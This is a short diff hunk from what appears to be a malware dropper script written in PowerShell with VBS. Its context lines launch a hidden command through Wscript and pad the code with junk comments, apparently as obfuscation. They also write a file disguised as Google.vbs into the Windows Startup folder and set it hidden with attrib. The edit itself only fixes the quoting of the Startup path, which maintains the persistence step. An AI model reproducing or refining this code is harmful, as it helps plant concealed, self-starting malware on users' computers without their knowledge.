@@ -16,7 +16,7 @@ CreateObject("Wscript."+ksayewnds).Run aiensjd, 0, false
 Start-Sleep -s 3
 #udgivugiugewivgiugidsgivgigiewgivgigsdigview
 #ugiugivugiewugigugfiuegwfgiewgucewgfiugewifugiwfg
-Set-Content -Path "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\Google.vbs" -Value $VBS_f_ile
+Set-Content -Path "$env:AppData\Microsoft\Windows\'Start Menu'\Programs\Startup\Google.vbs" -Value $VBS_f_ile
 #ugdsivugiuewgvgigdsuvgigugiugsdiugfiuewgifgiewugfiewgigfiwgugivwv
 attrib +h “$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\Google.vbs”
 #ugdiugviusgivgiewgugfigiewugfiuewgifgwef
